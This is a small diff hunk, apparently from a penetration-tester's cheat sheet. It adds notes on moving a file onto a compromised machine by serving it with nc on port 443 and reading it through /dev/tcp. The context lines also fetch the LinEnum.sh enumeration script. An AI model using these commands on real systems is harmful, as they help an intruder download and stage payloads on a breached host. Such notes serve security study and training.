@@ -1436,5 +1436,14 @@ fopen("[url]", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = frea
   ncat [ip] [port] --recv-only > newFileName.exe
 
 
+# If ncat or netcat are not at our disposal, try using "/dev/TCP"
+  1. Send file to comprimised machine 
+    sudo nc -l -p 443 -q 0 < fileToSend.exe 
+
+  2. Output tcp into file 
+    cat < /dev/tcp/[sender ip]/[port used] > newFileName.exe
+
+
 #
+
 ```
